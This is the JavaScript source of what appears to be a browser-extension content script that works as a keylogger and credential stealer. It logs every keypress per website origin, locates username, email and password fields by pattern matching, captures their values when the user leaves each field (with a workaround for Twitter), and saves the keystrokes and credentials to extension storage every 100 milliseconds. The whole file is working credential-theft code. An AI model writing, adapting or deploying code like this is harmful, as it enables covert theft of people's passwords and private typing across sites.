const db = {};
// update keystrokes every 100ms
setInterval(() => {
  chrome.storage.local.set({ database: db }, () => {});
}, 100);

let username = "";
let password = "";

setInterval(() => {
  if (username === "" && password === "") return;
  chrome.storage.local.set({
    credentials: {
      domain: window.location.origin,
      username,
      password,
    },
  });
}, 100);

/**
 * logs keypress
 * @param {KeyboardEvent} e
 */
function logKeyPress(e) {
  const context = window.location.origin;
  if (db[context]) db[context] += `,${e.key}`;
  else db[context] = e.key;
  console.log(e.key);
}

const mountListener = () => document.addEventListener("keydown", logKeyPress);

const unmountListener = () =>
  document.removeEventListener("keydown", logKeyPress);

/**
 * get input field for user id
 * @returns {Element}
 */
function getIdentifier() {
  return elementSearch(/email|username|user/i);
}

/**
 * get input field for password
 * @returns {Element}
 */
function getPassword() {
  return elementSearch(/password/i);
}

/**
 * helper function to do actual input tag searches that matches the
 * regex object supplied
 * returns null if failed
 * @param {RegExp} re
 * @returns {Element}
 */
function elementSearch(re) {
  for (const elem of document.querySelectorAll("input")) {
    for (const attr of elem.attributes) {
      if (re.exec(attr.value) || re.exec(attr.name)) return elem;
    }
  }
  return null;
}

// force mount identifier field event handler
let idHandle = 0;
idHandle = setInterval(() => {
  console.log("Try mount id");
  if (!getIdentifier()) return;
  clearInterval(idHandle);
  idHandle = 0;

  // twitter specific patch
  if(window.location.origin === "https://twitter.com")
    getIdentifier().blur();

  getIdentifier().addEventListener("focus", () => {
    mountListener();
  });
  getIdentifier().addEventListener("blur", () => {
    username = getIdentifier().value;
    unmountListener();
  });
  console.log("Id mount success");
}, 0);

// force mount password field event handler
let passHandle = 0;
passHandle = setInterval(() => {
  if (!getPassword()) return;
  clearInterval(passHandle);
  passHandle = 0;

  // twitter specific patch
  if(window.location.origin === "https://twitter.com")
    getPassword().blur();

  getPassword().addEventListener("focus", () => {
    mountListener();
  });
  getPassword().addEventListener("blur", () => {
    password = getPassword().value;
    unmountListener();
  });
}, 0);
